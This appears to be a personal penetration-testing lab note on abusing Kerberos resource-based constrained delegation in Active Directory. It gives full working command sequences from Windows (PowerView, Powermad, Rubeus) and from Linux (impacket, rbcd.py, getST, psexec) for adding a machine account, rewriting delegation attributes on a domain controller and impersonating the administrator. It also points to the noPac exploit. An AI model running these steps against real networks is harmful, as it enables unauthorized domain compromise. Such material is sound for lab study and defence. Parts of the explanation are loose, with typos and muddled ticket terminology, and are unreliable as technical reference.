`Resource-based constrained delegation` (`RBCD`) was introduced with Windows Server 2012. RBCD relies on security descriptors instead of an allowed list of SPNs. An administrator defines which security principals can request Kerberos tickets for a user. When a service receives a request to grant access on behalf of another user, the KDC checks against the [security descriptors](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptors) in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the principal running the backend service.
If the security descriptor of the backend service matches that of the frontend service, then access will be granted. RBCD works regardless of the domain functional level but does require at least one Domain Controller running Windows Server 2012 or later in the same domain as both the backend and frontend servers.

# Attacks
## From Windows
To carry out attacks against RBCD, we require two elements:
1. Access to a user or group that has privileges to modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` property on a computer. This is commonly possible if the user has `GenericWrite`, `GenericAll`, `WriteProperty`, or `WriteDACL` privileges on a computer object.
2. Control of another object that has an SPN.

We can start by checking all the computers and which users can edit the required attribute.
```powershell-session
# import the PowerView module
Import-Module C:\Tools\PowerView.ps1

# get all computers in the domain
$computers = Get-DomainComputer

# get all users in the domain
$users = Get-DomainUser

# define the required access rights
$accessRights = "GenericWrite","GenericAll","WriteProperty","WriteDacl"

# loop through each computer in the domain
foreach ($computer in $computers) {
    # get the security descriptor for the computer
    $acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs

    # loop through each user in the domain
    foreach ($user in $users) {
        # check if the user has the required access rights on the computer object
        $hasAccess = $acl | ?{$_.SecurityIdentifier -eq $user.ObjectSID} | %{($_.ActiveDirectoryRights -match ($accessRights -join '|'))}

        if ($hasAccess) {
            Write-Output "$($user.SamAccountName) has the required access rights on $($computer.Name)"
        }
    }
}
```
And running it shows one possible target.
```powershell-session
.\SearchRBCD.ps1

carole.holmes has the required access rights on DC01
```
Now to fullfill even the second requirement(aka a controlled SPN) the easiest is to add a dummy computer to domain(by default all users should have quota=10), this will ensure that the new PC holds a SPN that we can control.
```powershell-session
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount HACKTHEBOX -Password $(ConvertTo-SecureString "Hackthebox123+!" -AsPlainText -Force)

[+] Machine account HACKTHEBOX added
```
Now we need to modify the security attribute and allow the RBCD attack.
```powershell-session
Import-Module .\PowerView.ps1
$ComputerSid = Get-DomainComputer HACKTHEBOX -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
$credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Extracted domain 'INLANEFREIGHT.LOCAL' from 'CN=DC01,OU=Domain
Controllers,DC=INLANEFREIGHT,DC=LOCAL'
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC01,OU=Domain
Controllers,DC=INLANEFREIGHT,DC=LOCAL)))
VERBOSE: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0
36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 7 43 120 111
218 117 136 70 100 139 92 35 55 8 0 0' for object 'DC01$'
```
We must obtain the NMTL hash of the fake computer we just created.
```powershell-session
.\Rubeus.exe hash /password:Hackthebox123+! /user:HACKTHEBOX$ /domain:inlanefreight.local
```
Lastly we can request a valid TGT to the TGS that will be used for impersonation.
```powershell-session
.\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt
```
With the ticket injected into session enjoy your attacks.
```powershell-session
ls \\dc01.inlanefreight.local\c$
```
<font color="#ff0000">OBS: when done please cleanup!</font>
```powershell-session
Import-Module .\PowerView.ps1
PS C:\Tools> $credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
PS C:\Tools> Get-DomainComputer DC01 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity -Credential $credentials -Verbose
```
## From Linux
Same process applies when attacked from Linux. We start by adding a fake PC to domain.
```shell-session
impacket-addcomputer -computer-name 'HACKTHEBOX$' -computer-pass Hackthebox123+\! -dc-ip 10.129.205.35 inlanefreight.local/carole.holmes
```
Enumerate the rights with Bloodhound.
Now add the RBCD attributes with this tool https://github.com/tothi/rbcd-attack/tree/master
```shell-session
python3 rbcd.py -dc-ip 10.129.205.35 -t DC01 -f HACKTHEBOX inlanefreight\\carole.holmes:Y3t4n0th3rP4ssw0rd
```
Aks the TGS to obtain a valid TGT that will perform a impersonation as administrator on the victim.
```shell-session
impacket-getST -spn cifs/DC01.inlanefreight.local -impersonate Administrator -dc-ip 10.129.205.35 inlanefreight.local/HACKTHEBOX:Hackthebox123+\!
```
Use the obtained *ccache* to take your attacks further.


# Tips
##  Troubleshooting
```
[-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```
If you see this error when trying to use the genr generated TGS to login ex via psxec then the issue is most likely that you are not using the FQDN but instead the ip. 
If you generate with this:
```
 getST.py -spn 'cifs/DC02.DEV.ADMIN.OFFSHORE.COM' -dc-ip 172.16.2.6 <SNIP>
```
 Then you have to login with same name(must be resolvable by the DNS as well)
```
 impacket-psexec <SNIP>@DC02.DEV.ADMIN.OFFSHORE.COM -k -no-pass
```
**OBS**: as you see here the *@FQDN* matches exactly the value defined in the **-spn**. This is extremely important as Kerbeos is very problematic when the DNS names must match and even if on DNS should work on Kerberos is another story.
## ms-ds-machineaccountquota
If you find yourself in a Windows DC machine where your username have the possibility to add workstations to AD then you can follow 2 possible scenarios.
Reference: https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota
1)NOPAC:https://github.com/Ridter/noPac
If you use this one, it will be pretty easy as it will do basically all the job for you. 
OBS: it is a CVE so it might not work if the target has been patched!

2)Use Kerberos RBCD, I have a usefull guide in the same folder(PART #3)
Reference: https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
**Basically you add a new computer, add a delegation to the computer object to gain Generic write over the object by the DC via attribute AllowedToActOnBehalfOfOtherIdentity .**
Then perform the S4U (Service For User) to get a TGT that will be used for impersonation.
Enjoy!